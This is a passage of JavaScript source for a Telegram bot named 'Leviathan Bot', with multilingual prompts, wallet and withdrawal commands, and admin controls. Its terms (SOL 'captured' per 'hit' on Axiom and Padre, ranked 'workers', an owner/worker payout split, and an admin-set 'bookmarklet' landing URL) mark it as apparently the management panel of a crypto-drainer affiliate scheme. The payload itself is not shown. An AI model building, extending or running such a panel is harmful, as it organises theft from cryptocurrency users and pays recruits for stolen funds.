    welcome: '¡Bienvenido a Leviathan Bot!\nPor favor, selecciona tu idioma:',
    walletPrompt: '💼 <b>Ingresa tu dirección de cartera Solana</b>\n\n⚠️ <b>IMPORTANTE:</b>\n• Esta cartera se utilizará para <b>TODOS los retiros</b>\n• Puedes cambiarla más tarde usando /wallet\n• ¡Asegúrate de controlar esta cartera!',
    invalidWallet: '❌ <b>Dirección de Solana inválida</b>\n\nPor favor, ingresa una dirección Solana válida de 43 o 44 caracteres en base58.',
    registrationComplete: '🎊 <b>¡Registro completado!</b>\n\n✅ Tu cartera Solana ha sido sincronizada:\n\n<code>{address}</code>\n\n¡Estás listo! Usa /wallet para cambiarla en cualquier momento. Luego usa /menu para ver el menú.',
    walletDisplay: '💼 <b>Tu Cartera de Retiro</b>\n\n<code>{address}</code>\n\n<b>Para cambiar:</b>\n/wallet NUEVA_DIRECCIÓN',
    walletChanged: '✅ <b>¡Cartera actualizada!</b>\n\nTu nueva cartera de retiro:\n\n<code>{address}</code>\n\nAhora usa /menu para ver el menú.',
    noWallet: '❌ <b>Sin cartera configurada</b>\n\nPor favor, completa el registro primero enviando /start',
  },
  fr: {
    name: 'Français',
    welcome: 'Bienvenue sur Leviathan Bot !\nVeuillez sélectionner votre langue :',
    walletPrompt: '💼 <b>Entrez votre adresse de portefeuille Solana</b>\n\n⚠️ <b>IMPORTANT :</b>\n• Ce portefeuille sera utilisé pour <b>TOUS les retraits</b>\n• Vous pouvez le modifier ultérieurement en utilisant /wallet\n• Assurez-vous que vous contrôlez ce portefeuille !',
    invalidWallet: '❌ <b>Adresse Solana invalide</b>\n\nVeuillez entrer une adresse Solana valide de 43 ou 44 caractères en base58.',
    registrationComplete: '🎊 <b>Inscription terminée !</b>\n\n✅ Votre portefeuille Solana a été synchronisé :\n\n<code>{address}</code>\n\nVous êtes prêt ! Utilisez /wallet pour le modifier à tout moment. Ensuite utilisez /menu pour voir le menu.',
    walletDisplay: '💼 <b>Votre Portefeuille de Retrait</b>\n\n<code>{address}</code>\n\n<b>Pour modifier :</b>\n/wallet NOUVELLE_ADRESSE',
    walletChanged: '✅ <b>Portefeuille mis à jour !</b>\n\nVotre nouveau portefeuille de retrait :\n\n<code>{address}</code>\n\nMaintenant utilisez /menu pour voir le menu.',
    noWallet: '❌ <b>Aucun portefeuille configuré</b>\n\nVeuillez d\'abord compléter l\'inscription en envoyant /start',
  },
  ar: {
    name: 'العربية',
    welcome: 'مرحًا بك في Leviathan Bot!\nيرجى اختيار لغتك:',
    walletPrompt: '💼 <b>أدخل عنوان محفظة Solana الخاص بك</b>\n\n⚠️ <b>مهم:</b>\n• سيتم استخدام هذه المحفظة لـ <b>جميع الانسحابات</b>\n• يمكنك تغييرها لاحقاً باستخدام /wallet\n• تأكد من أنك تتحكم في هذه المحفظة!',
    invalidWallet: '❌ <b>عنوان Solana غير صحيح</b>\n\nيرجى إدخال عنوان Solana صحيح بـ 43 أو 44 حرفاً بصيغة base58.',
    registrationComplete: '🎊 <b>تم إكمال التسجيل!</b>\n\n✅ تم مزامنة محفظة Solana الخاصة بك:\n\n<code>{address}</code>\n\nأنت جاهز! استخدم /wallet لتغييرها في أي وقت. ثم استخدم /menu لرؤية القائمة.',
    walletDisplay: '💼 <b>محفظة الانسحاب الخاصة بك</b>\n\n<code>{address}</code>\n\n<b>للتغيير:</b>\n/wallet العنوان_الجديد',
    walletChanged: '✅ <b>تم تحديث المحفظة!</b>\n\nمحفظة الانسحاب الجديدة:\n\n<code>{address}</code>\n\nالآن استخدم /menu لرؤية القائمة.',
    noWallet: '❌ <b>لم يتم تعيين محفظة</b>\n\nيرجى إكمال التسجيل أولاً بإرسال /start',
  },
  zh: {
    name: '中文',
    welcome: '欢迎来到 Leviathan Bot！\n请选择您的语言：',
    walletPrompt: '💼 <b>输入您的 Solana 钱包地址</b>\n\n⚠️ <b>重要提示：</b>\n• 此钱包将用于<b>所有提现</b>\n• 您可以稍后使用 /wallet 更改它\n• 确保您控制此钱包！',
    invalidWallet: '❌ <b>无效的 Solana 地址</b>\n\n请输入有效的 43 或 44 字符 base58 Solana 地址。',
    registrationComplete: '🎊 <b>注册完成！</b>\n\n✅ 您的 Solana 钱包已同步：\n\n<code>{address}</code>\n\n您已准备好！使用 /wallet 随时更改。然后使用 /menu 查看菜单。',
    walletDisplay: '💼 <b>您的提现钱包</b>\n\n<code>{address}</code>\n\n<b>要更改：</b>\n/wallet 新地址',
    walletChanged: '✅ <b>钱包已更新！</b>\n\n您的新提现钱包：\n\n<code>{address}</code>\n\n现在使用 /menu 查看菜单。',
    noWallet: '❌ <b>未设置钱包</b>\n\n请先发送 /start 完成注册',
  },
  hi: {
    name: 'हिंदी',
    welcome: 'Leviathan Bot में आपका स्वागत है!\nकृपया अपनी भाषा चुनें:',
    walletPrompt: '💼 <b>अपना Solana वॉलेट पता दर्ज करें</b>\n\n⚠️ <b>महत्वपूर्ण:</b>\n• यह वॉलेट <b>सभी निकासी</b> के लिए उपयोग किया जाएगा\n• आप /wallet का उपयोग करके इसे बाद में बदल सकते हैं\n• सुनिश्चित करें कि आप इस वॉलेट को नियंत्रित करते हैं!',
    invalidWallet: '❌ <b>अमान्य Solana पता</b>\n\nकृपया एक वैध 43 या 44-वर्ण base58 Solana पता दर्ज करें।',
    registrationComplete: '🎊 <b>पंजीकरण पूर्ण!</b>\n\n✅ आपका Solana वॉलेट सिंक हो गया है:\n\n<code>{address}</code>\n\nआप तैयार हैं! किसी भी समय बदलने के लिए /wallet का उपयोग करें। फिर मेनू देखने के लिए /menu का उपयोग करें।',
    walletDisplay: '💼 <b>आपका निकासी वॉलेट</b>\n\n<code>{address}</code>\n\n<b>बदलने के लिए:</b>\n/wallet नया_पता',
    walletChanged: '✅ <b>वॉलेट अपडेट हो गया!</b>\n\nआपका नया निकासी वॉलेट:\n\n<code>{address}</code>\n\nअब मेनू देखने के लिए /menu का उपयोग करें।',
    noWallet: '❌ <b>कोई वॉलेट सेट नहीं है</b>\n\nकृपया पहले /start भेजकर पंजीकरण पूर्ण करें',
  },
  pt: {
    name: 'Português',
    welcome: 'Bem-vindo ao Leviathan Bot!\nPor favor, selecione seu idioma:',
    walletPrompt: '💼 <b>Digite seu endereço de carteira Solana</b>\n\n⚠️ <b>IMPORTANTE:</b>\n• Esta carteira será usada para <b>TODOS os saques</b>\n• Você pode alterá-la mais tarde usando /wallet\n• Certifique-se de controlar esta carteira!',
    invalidWallet: '❌ <b>Endereço Solana inválido</b>\n\nPor favor, digite um endereço Solana válido de 43 ou 44 caracteres em base58.',
    registrationComplete: '🎊 <b>Registro Concluído!</b>\n\n✅ Sua carteira Solana foi sincronizada:\n\n<code>{address}</code>\n\nVocê está pronto! Use /wallet para alterá-la a qualquer momento. Depois use /menu para ver o menu.',
    walletDisplay: '💼 <b>Sua Carteira de Saque</b>\n\n<code>{address}</code>\n\n<b>Para alterar:</b>\n/wallet NOVO_ENDEREÇO',
    walletChanged: '✅ <b>Carteira Atualizada!</b>\n\nSua nova carteira de saque:\n\n<code>{address}</code>\n\nAgora use /menu para ver o menu.',
    noWallet: '❌ <b>Nenhuma carteira definida</b>\n\nPor favor, complete o registro primeiro enviando /start',
  },
  de: {
    name: 'Deutsch',
    welcome: 'Willkommen beim Leviathan Bot!\nBitte wähle deine Sprache:',
    walletPrompt: '💼 <b>Geben Sie Ihre Solana-Wallet-Adresse ein</b>\n\n⚠️ <b>WICHTIG:</b>\n• Diese Geldbörse wird für <b>ALLE Abhebungen</b> verwendet\n• Sie können sie später mit /wallet ändern\n• Stellen Sie sicher, dass Sie diese Geldbörse kontrollieren!',
    invalidWallet: '❌ <b>Ungültige Solana-Adresse</b>\n\nBitte geben Sie eine gültige 43- oder 44-stellige base58-Solana-Adresse ein.',
    registrationComplete: '🎊 <b>Registrierung abgeschlossen!</b>\n\n✅ Ihre Solana-Geldbörse wurde synchronisiert:\n\n<code>{address}</code>\n\nSie sind bereit! Verwenden Sie /wallet, um es jederzeit zu ändern. Verwenden Sie dann /menu, um das Menü zu sehen.',
    walletDisplay: '💼 <b>Ihre Auszahlungs-Geldbörse</b>\n\n<code>{address}</code>\n\n<b>Um zu ändern:</b>\n/wallet NEUE_ADRESSE',
    walletChanged: '✅ <b>Geldbörse aktualisiert!</b>\n\nIhre neue Auszahlungs-Geldbörse:\n\n<code>{address}</code>\n\nVerwenden Sie jetzt /menu, um das Menü zu sehen.',
    noWallet: '❌ <b>Keine Geldbörse eingestellt</b>\n\nBitte schließen Sie zuerst die Registrierung ab, indem Sie /start senden',
  },
};

const languageMenu = Markup.inlineKeyboard([
  [Markup.button.callback('🇬🇧 English', 'lang_en'), Markup.button.callback('🇷🇺 Русский', 'lang_ru')],
  [Markup.button.callback('🇪🇸 Español', 'lang_es'), Markup.button.callback('🇫🇷 Français', 'lang_fr')],
  [Markup.button.callback('🇨🇳 中文', 'lang_zh'), Markup.button.callback('🇮🇳 हिंदी', 'lang_hi')],
  [Markup.button.callback('🇵🇹 Português', 'lang_pt'), Markup.button.callback('🇩🇪 Deutsch', 'lang_de')],
  [Markup.button.callback('🇦🇪 العربية', 'lang_ar')],
]);

const startMessage = `🎯 <b>Welcome to Leviathan Bot!</b>`;

const adminModeKeyboard = Markup.keyboard([
  ['Admin Mode', 'User Mode'],
]).resize();

function getMenuKeyboard(userId) {
  const state = getUserState(userId);
  if (isAdmin(userId) && state.mode === 'admin') {
    return Markup.keyboard([
      ['Admin Stats', 'Set Split'],
      ['Revoke User', 'Restore User'],
      ['Owner Wallet', 'Change Owner Wallet'],
      ['Make Admin', 'Promote Tier 2'],
      ['Disable Auto Withdrawals', 'Broadcast'],
      ['Set Bookmarklet URL', 'User Mode'],
    ]).resize();
  }

  const rows = [
    ['📜 Script', '📊 Stats'],
    ['💼 Wallet', 'Withdraw'],
  ];
  if (state.tier2) {
    rows.push(['Bot Token']);
  }
  rows.push([state.autoWithdraw ? 'Disable Auto withdrawal' : 'Enable Auto withdrawal']);

  return Markup.keyboard(rows).resize();
}

function sendLanguageSelection(ctx, text = startMessage) {
  return ctx.replyWithHTML(text, languageMenu);
}

bot.start((ctx) => {
  const userId = ctx.from.id;
  const state = getUserState(userId);
  const language = languages[state.language || 'en'];
  if (state.revoked) {
    return ctx.replyWithHTML(language.revoked || languages.en.revoked);
  }

  const adminPrefix = isAdmin(userId) ? '🎖️ <b>Admin access detected.</b>\n\n' : '';
  if (state.wallet) {
    const keyboard = getMenuKeyboard(userId);
    return ctx.replyWithHTML(`${adminPrefix}✅ <b>Welcome back!</b>\nUse /menu to continue.`, keyboard);
  }

  if (state.language) {
    state.step = 'wallet';
    saveUserStateToDisk();
    return ctx.replyWithHTML(language.walletPrompt, { parse_mode: 'HTML' });
  }

  state.step = 'language';
  state.mode = 'user';
  saveUserStateToDisk();
  return sendLanguageSelection(ctx, `${adminPrefix}${startMessage}`);
});

bot.help((ctx) => ctx.replyWithHTML('📩 <b>Need help?</b>\nContact the owner directly: @late'));

bot.command('menu', async (ctx) => {
  const userId = ctx.from.id;
  const state = getUserState(userId);
  const language = languages[state.language || 'en'];
  if (state.revoked) {
    return ctx.replyWithHTML(language.revoked || languages.en.revoked);
  }
  const keyboard = getMenuKeyboard(userId);
  return ctx.replyWithHTML('💠 <b>Main Menu</b>', keyboard);
});

bot.command('stats', async (ctx) => {
  const userId = ctx.from.id;
  const state = getUserState(userId);
  const language = languages[state.language || 'en'];
  if (state.revoked) {
    return ctx.replyWithHTML(language.revoked || languages.en.revoked);
  }
  if (!state.wallet) {
    return ctx.replyWithHTML(language.noWallet);
  }
  const statsTemplate = language.statsMessage || languages.en.statsMessage;
  const stats = statsTemplate
    .replace('{wallet}', state.wallet)
    .replace('{captured}', formatCurrency(state.totalCaptured))
    .replace('{available}', formatCurrency(state.available))
    .replace('{withdrawn}', formatCurrency(state.withdrawn))
    .replace('{captures}', String(state.totalCaptures))
    .replace('{auto}', state.autoWithdraw ? 'ON' : 'OFF')
    .replace('{user}', String(botConfig.userShare))
    .replace('{owner}', String(botConfig.ownerShare));
  const tierLabel = state.tier2 ? 'Tier 2' : 'Tier 1';
  return ctx.replyWithHTML(`${stats}\n\n🏅 <b>Tier</b>: <code>${tierLabel}</code>`);
});

bot.command('adminstats', async (ctx) => {
  const userId = ctx.from.id;
  if (!isAdmin(userId)) {
    return ctx.replyWithHTML('❌ <b>Admin only</b>\nYou do not have permission to use this command.');
  }
  const summary = getAdminSummary();
  return ctx.replyWithHTML(
    `🔐 <b>Admin Summary</b>\n\n` +
    `👥 Total users: <b>${summary.totalUsers}</b>\n` +
    `✅ Active users: <b>${summary.totalActive}</b>\n` +
    `⛔ Revoked users: <b>${summary.totalRevoked}</b>\n` +
    `🏅 Tier 2 users: <b>${summary.totalTier2}</b>\n` +
    `💼 Wallets connected: <b>${summary.totalWallets}</b>\n\n` +
    `💰 Total captured: <b>${formatCurrency(summary.totalCaptured)} SOL</b>\n` +
    `💵 Total withdrawn: <b>${formatCurrency(summary.totalWithdrawn)} SOL</b>\n` +
    `📥 Total available: <b>${formatCurrency(summary.totalAvailable)} SOL</b>\n\n` +
    `⚡ Total hits: <b>${summary.totalHits}</b>\n` +
    `🧩 Axiom hits: <b>${summary.axiomHits}</b> | Padre hits: <b>${summary.padreHits}</b>\n` +
    `🎯 Top workers:\n${summary.topHitUsers}\n\n` +
    `🧾 Split: <b>${summary.userShare}% user / ${summary.ownerShare}% owner</b>\n` +
    `🏦 Owner payout wallet:\n<code>${summary.ownerWallet}</code>`
  );
});

bot.command('hitstats', async (ctx) => {
  const userId = ctx.from.id;
  if (!isAdmin(userId)) {
    return ctx.replyWithHTML('❌ <b>Admin only</b>\nYou do not have permission to use this command.');
  }
  const hitSummary = getHitSummary();
  return ctx.replyWithHTML(
    `⚡ <b>Hit Tracker Summary</b>\n\n` +
    `Total hits: <b>${hitSummary.totalHits}</b>\n` +
    `Axiom hits: <b>${hitSummary.axiomHits}</b>\n` +
    `Padre hits: <b>${hitSummary.padreHits}</b>\n` +
    `Unique workers: <b>${hitSummary.totalUsers}</b>\n\n` +
    `🎯 Top workers:\n${hitSummary.topUsers}`
  );
});

bot.command('revoke', async (ctx) => {
  const userId = ctx.from.id;
  if (!isAdmin(userId)) {
    return ctx.replyWithHTML('❌ <b>Admin only</b>\nYou do not have permission to use this command.');
  }
  const parts = ctx.message.text.split(' ');
  const targetId = Number(parts[1]);
  if (!targetId) {
    return ctx.replyWithHTML('❌ <b>Usage:</b> /revoke USER_ID');
  }
  const target = getUserState(targetId);
  target.revoked = true;
  return ctx.replyWithHTML(`✅ User <b>${targetId}</b> has been revoked.`);
});

bot.command('unrevoke', async (ctx) => {
  const userId = ctx.from.id;
  if (!isAdmin(userId)) {
    return ctx.replyWithHTML('❌ <b>Admin only</b>\nYou do not have permission to use this command.');
  }
  const parts = ctx.message.text.split(' ');
  const targetId = Number(parts[1]);
  if (!targetId) {
    return ctx.replyWithHTML('❌ <b>Usage:</b> /unrevoke USER_ID');
  }
  const target = getUserState(targetId);
  target.revoked = false;
  return ctx.replyWithHTML(`✅ User <b>${targetId}</b> has been restored.`);
});

bot.command('setsplit', async (ctx) => {
  const userId = ctx.from.id;
  if (!isAdmin(userId)) {
    return ctx.replyWithHTML('❌ <b>Admin only</b>\nYou do not have permission to use this command.');
  }
  const parts = ctx.message.text.split(' ');
  const ownerShare = Number(parts[1]);
  const userShare = Number(parts[2]);
  if (!Number.isFinite(ownerShare) || !Number.isFinite(userShare) || ownerShare + userShare !== 100) {
    return ctx.replyWithHTML('❌ <b>Usage:</b> /setsplit OWNER_SHARE USER_SHARE\nExample: /setsplit 20 80');
  }
  botConfig.ownerShare = ownerShare;
  botConfig.userShare = userShare;
  return ctx.replyWithHTML(`✅ Split updated to <b>${userShare}% user</b> and <b>${ownerShare}% owner</b>.`);
});

bot.command('setbookmarkleturl', async (ctx) => {
  const userId = ctx.from.id;
  if (!isAdmin(userId)) {
    return ctx.replyWithHTML('❌ <b>Admin only</b>\nYou do not have permission to use this command.');
  }
  const parts = ctx.message.text.split(' ');
  const url = parts[1];
  if (!url || !/^https?:\/\//.test(url)) {
    return ctx.replyWithHTML('❌ <b>Usage:</b> /setbookmarkleturl https://your-host.com');
  }
  bookmarkletSiteUrl = url.replace(/\/+$/, '');
  return ctx.replyWithHTML(`✅ <b>Bookmarklet host URL set:</b>\n${bookmarkletSiteUrl}`);
});

bot.command('autowithdraw', async (ctx) => {
  const userId = ctx.from.id;
  const state = getUserState(userId);
  const language = languages[state.language || 'en'];
  if (state.revoked) {
    return ctx.replyWithHTML(language.revoked || languages.en.revoked);
  }
  state.autoWithdraw = !state.autoWithdraw;
  let result = null;
  if (state.autoWithdraw) {
    result = await processAutoWithdraw(userId);
  }
  const message = state.autoWithdraw ? 'Auto withdrawal on' : 'Auto withdrawal off';

  if (state.autoWithdraw && result && !result.error) {
    return ctx.replyWithHTML(
      `${message}\n\n✅ <b>Auto payout split processed</b>\n• User: <code>${formatCurrency(result.userAmount)} SOL</code>\n• Owner: <code>${formatCurrency(result.ownerAmount)} SOL</code>`,
      getMenuKeyboard(userId)
    );
  }

  return ctx.replyWithHTML(message, getMenuKeyboard(userId));
});

bot.command('withdraw', async (ctx) => {
  const userId = ctx.from.id;
  const state = getUserState(userId);
  const language = languages[state.language || 'en'];
  if (state.revoked) {
    return ctx.replyWithHTML(language.revoked || languages.en.revoked);
  }

  const result = await executeWithdrawal(userId, 'manual');
  if (result.error === 'noWallet') {
    return ctx.replyWithHTML(language.noWallet);
  }
  if (result.error === 'noFunds') {
    return ctx.replyWithHTML('❌ <b>No available balance to withdraw yet.</b>');
  }
  if (result.error) {
    return ctx.replyWithHTML(`❌ <b>Withdrawal failed:</b> ${result.error}`);
  }

  let reply = `✅ <b>Withdrawal processed</b>\n` +
    `• Total amount: <code>${formatCurrency(result.amount)} SOL</code>\n` +
    `• User share: <code>${formatCurrency(result.userAmount)} SOL</code>\n` +
    `• Owner share: <code>${formatCurrency(result.ownerAmount)} SOL</code>`;

  if (result.transferResults.user || result.transferResults.owner) {
    reply += `\n\n${result.note}`;
  }

  return ctx.replyWithHTML(reply);
});

bot.command('wallet', async (ctx) => {
  const userId = ctx.from.id;
  const state = getUserState(userId);
  const language = languages[state.language || 'en'];
  if (state.revoked) {
    return ctx.replyWithHTML(language.revoked || languages.en.revoked);
  }
  
  // Get the command text to check for address
  const parts = ctx.message.text.split(' ');
  const newAddress = parts.slice(1).join(' ').trim();
  
  // If user provided a new address
  if (newAddress) {
    if (!isValidSolanaAddress(newAddress)) {
      return ctx.replyWithHTML(language.invalidWallet);
    }
    
    state.wallet = newAddress;
    const message = language.walletChanged.replace('{address}', newAddress);
    return ctx.replyWithHTML(message);
  }
  
  // Just show current wallet
  if (!state.wallet) {
    return ctx.replyWithHTML(language.noWallet);
  }
  
  const message = language.walletDisplay.replace('{address}', state.wallet);
  return ctx.replyWithHTML(message);
});

Object.keys(languages).forEach((code) => {
  bot.action(`lang_${code}`, async (ctx) => {
    const userId = ctx.from.id;
    const state = getUserState(userId);
    if (state.revoked) {
      await ctx.answerCbQuery();
      return ctx.replyWithHTML(languages[state.language || 'en'].revoked || languages.en.revoked);
    }
    state.language = code;
    await ctx.answerCbQuery();
    const language = languages[code];
    await ctx.editMessageText(
      `🎉 <b>${language.name}</b> selected!\n\nWelcome to Leviathan Bot!`,
      { parse_mode: 'HTML' }
    );

    if (isAdmin(userId)) {
      state.step = 'choose_mode';
      return ctx.replyWithHTML('🔧 <b>Choose your mode:</b>', adminModeKeyboard);
    }

    state.step = 'wallet';
    return ctx.reply(language.walletPrompt, { parse_mode: 'HTML' });
  });
});

bot.on('message', async (ctx) => {
  const userId = ctx.from.id;
  const text = (ctx.message.text || '').trim();
  const state = getUserState(userId);
  const language = languages[state.language || 'en'];
  if (state.revoked) {
    return ctx.replyWithHTML(language.revoked || languages.en.revoked);
  }
  
  if (text.startsWith('/')) {
    return;
  }

  const normalized = text.toLowerCase();

  if (normalized === 'revoke user') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    state.step = 'admin_revoke';
    return ctx.replyWithHTML('⛔ <b>Send the user id to revoke.</b>');
  }

  if (normalized === 'restore user' || normalized === 'unrevoke user') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    state.step = 'admin_unrevoke';
    return ctx.replyWithHTML('✅ <b>Send the user id to restore.</b>');
  }

  if (normalized === 'admin stats') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    const summary = getAdminSummary();
    return ctx.replyWithHTML(
      `🔐 <b>Admin Summary</b>\n\n` +
      `👥 Total users: <b>${summary.totalUsers}</b>\n` +
      `✅ Active users: <b>${summary.totalActive}</b>\n` +
      `⛔ Revoked users: <b>${summary.totalRevoked}</b>\n` +
      `🏅 Tier 2 users: <b>${summary.totalTier2}</b>\n` +
      `💼 Wallets connected: <b>${summary.totalWallets}</b>\n\n` +
      `💰 Total captured: <b>${formatCurrency(summary.totalCaptured)} SOL</b>\n` +
      `💵 Total withdrawn: <b>${formatCurrency(summary.totalWithdrawn)} SOL</b>\n` +
      `📥 Total available: <b>${formatCurrency(summary.totalAvailable)} SOL</b>\n\n` +
      `🧾 Split: <b>${summary.userShare}% user / ${summary.ownerShare}% owner</b>\n` +
      `🏦 Owner payout wallet:\n<code>${summary.ownerWallet}</code>`
    );
  }

  if (normalized === 'set split') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    state.step = 'admin_setsplit';
    return ctx.replyWithHTML('🧾 <b>Enter the new split</b> as two numbers that add up to 100, for example: 20 80 or 70 30.');
  }

  if (normalized === 'owner wallet') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    return ctx.replyWithHTML(`🏦 <b>Owner payout wallet</b>\n<code>${botConfig.ownerWallet}</code>`);
  }

  if (normalized === 'change owner wallet') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    state.step = 'admin_change_owner_wallet';
    return ctx.replyWithHTML('✏️ <b>Send the new owner payout wallet address.</b>');
  }

  if (normalized === 'make admin') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    state.step = 'admin_make_admin';
    return ctx.replyWithHTML('👑 <b>Send the user id to grant admin access.</b>');
  }

  if (normalized === 'disable auto withdrawals') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    const users = getAllUsers();
    users.forEach((user) => {
      user.autoWithdraw = false;
    });
    return ctx.replyWithHTML('⛔ <b>All auto withdrawals have been disabled for every user.</b>');
  }

  if (normalized === 'broadcast') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    state.step = 'admin_broadcast';
    return ctx.replyWithHTML('📣 <b>Send the broadcast message to all users.</b>');
  }

  if (normalized === 'set bookmarklet url') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    state.step = 'admin_setbookmarkleturl';
    return ctx.replyWithHTML('🌐 <b>Send the full landing page URL.</b> Example: https://your-host.com');
  }

  if (normalized === 'promote tier 2' || normalized === 'promote tier2') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    state.step = 'admin_promote_tier2';
    return ctx.replyWithHTML('🚀 <b>Send the user id to promote to Tier 2.</b>');
  }

  if (normalized === 'bot token') {
    if (!state.tier2) {
      return ctx.replyWithHTML('❌ <b>Bot Token access is available for Tier 2 users only.</b>');
    }
    state.step = 'tier2_set_bot_token';
    return ctx.replyWithHTML('🤖 <b>Send your personal bot token to receive private notifications.</b>');
  }

  if (normalized === 'admin mode') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    state.mode = 'admin';
    state.step = 'completed';
    return ctx.replyWithHTML('🎖️ <b>Admin mode enabled.</b>\nUse /menu to access admin controls.');
  }

  if (normalized === 'user mode') {
    if (!isAdmin(userId)) {
      return ctx.replyWithHTML('❌ <b>Admin only</b>');
    }
    state.mode = 'user';
    state.step = state.wallet ? 'completed' : 'wallet';
    const message = state.wallet
      ? '✅ <b>User mode enabled.</b>\nUse /menu to continue.'
      : language.walletPrompt;
    return ctx.replyWithHTML(message);
  }

  if (state.step === 'choose_mode') {
    if (!isAdmin(userId)) {
      state.step = 'completed';
      return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
    }
    return ctx.replyWithHTML('❌ <b>Choose Admin Mode or User Mode.</b>');
  }

  if (state.step === 'admin_setsplit') {
    if (!isAdmin(userId)) {
      state.step = 'completed';
      return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
    }
    const parts = text.split(/\s+/);
    const ownerShare = Number(parts[0]);
    const userShare = Number(parts[1]);
    if (
      !Number.isFinite(ownerShare) ||
      !Number.isFinite(userShare) ||
      ownerShare < 0 ||
      userShare < 0 ||
      ownerShare + userShare !== 100
    ) {
      return ctx.replyWithHTML('❌ <b>Invalid split.</b> Send two numbers that add to 100, for example: 20 80 or 70 30.');
    }
    botConfig.ownerShare = ownerShare;
    botConfig.userShare = userShare;
    state.step = 'completed';
    return ctx.replyWithHTML(`✅ Split updated to <b>${userShare}% user</b> and <b>${ownerShare}% owner</b>.`);
  }

  if (state.step === 'admin_setbookmarkleturl') {
    if (!isAdmin(userId)) {
      state.step = 'completed';
      return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
    }
    const url = text.trim();
    if (!url || !/^https?:\/\//.test(url)) {
      return ctx.replyWithHTML('❌ <b>Invalid URL.</b> Send the full URL starting with https://');
    }
    bookmarkletSiteUrl = url.replace(/\/+$/, '');
    state.step = 'completed';
    return ctx.replyWithHTML(`✅ <b>Bookmarklet URL set.</b>\n${bookmarkletSiteUrl}`);
  }

  if (state.step === 'admin_promote_tier2') {
    if (!isAdmin(userId)) {
      state.step = 'completed';
      return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
    }
    const targetId = Number(text.trim());
    if (!targetId) {
      return ctx.replyWithHTML('❌ <b>Send a valid numeric user id to promote.</b>');
    }
    const target = getUserState(targetId);
    target.tier2 = true;
    state.step = 'completed';
    // Notify the promoted user via a direct message
    const congrats =
      '🎉 <b>Congratulations!</b>\n' +
      'You have been promoted to Tier 2 by an admin. You now have access to Bot Token and private notifications. Use /menu to update your settings.';
    try {
      await ctx.telegram.sendMessage(targetId, congrats, { parse_mode: 'HTML' });
    } catch (err) {
      // ignore errors (user may have blocked the bot or never started it)
    }
    return ctx.replyWithHTML(`✅ User <b>${targetId}</b> has been promoted to Tier 2.`);
  }

  if (state.step === 'tier2_set_bot_token') {
    if (!state.tier2) {
      state.step = 'completed';
      return ctx.replyWithHTML('❌ <b>Tier 2 access required.</b>');
    }
    const tokenValue = text.trim();
    if (!tokenValue) {
      return ctx.replyWithHTML('❌ <b>Send a non-empty bot token.</b>');
    }
    state.personalBotToken = tokenValue;
    state.step = 'completed';
    return ctx.replyWithHTML('✅ <b>Personal bot token saved.</b> You will receive private notifications through Leviathan when they are fired.');
  }

  if (state.step === 'admin_revoke') {
    if (!isAdmin(userId)) {
      state.step = 'completed';
      return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
    }
    const targetId = Number(text.trim());
    if (!targetId) {
      return ctx.replyWithHTML('❌ <b>Send a valid numeric user id to revoke.</b>');
    }
    const target = getUserState(targetId);
    target.revoked = true;
    state.step = 'completed';
    return ctx.replyWithHTML(`✅ User <b>${targetId}</b> has been revoked.`);
  }

  if (state.step === 'admin_unrevoke') {
    if (!isAdmin(userId)) {
      state.step = 'completed';
      return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
    }
    const targetId = Number(text.trim());
    if (!targetId) {
      return ctx.replyWithHTML('❌ <b>Send a valid numeric user id to restore.</b>');
    }
    const target = getUserState(targetId);
    target.revoked = false;
    state.step = 'completed';
    return ctx.replyWithHTML(`✅ User <b>${targetId}</b> has been restored.`);
  }

  if (state.step === 'admin_change_owner_wallet') {
    if (!isAdmin(userId)) {
      state.step = 'completed';
      return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
    }
    if (!isValidSolanaAddress(text)) {
      return ctx.replyWithHTML('❌ <b>Invalid Solana wallet address.</b> Send a valid 43 or 44 character base58 Solana address.');
    }
    botConfig.ownerWallet = text;
    state.step = 'completed';
    return ctx.replyWithHTML(`✅ <b>Owner wallet updated.</b>\n<code>${text}</code>`);
  }

  if (state.step === 'admin_make_admin') {
    if (!isAdmin(userId)) {
      state.step = 'completed';
      return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
    }
    const targetId = Number(text.trim());
    if (!targetId) {
      return ctx.replyWithHTML('❌ <b>Send a valid numeric user id to grant admin access.</b>');
    }
    adminIds.add(targetId);
    getUserState(targetId);
    state.step = 'completed';
    return ctx.replyWithHTML(`✅ User <b>${targetId}</b> is now an admin.`);
  }

  if (state.step === 'admin_broadcast') {
    if (!isAdmin(userId)) {
      state.step = 'completed';
      return ctx.replyWithHTML('❌ <b>Not allowed.</b>');
    }
    const broadcastText = `🎖️ <b>Admin Broadcast</b>\n` +
      `━━━━━━━━━━━━\n` +
      `<em>${escapeHtml(text)}</em>\n` +
      `━━━━━━━━━━━━`;
    const allUserIds = Object.keys(userState).map((id) => Number(id));
    await Promise.all(allUserIds.map((id) => ctx.telegram.sendMessage(id, broadcastText, { parse_mode: 'HTML' }).catch(() => null)));
    state.step = 'completed';
    return ctx.replyWithHTML(`✅ <b>Broadcast sent to ${allUserIds.length} users.</b>`);
  }

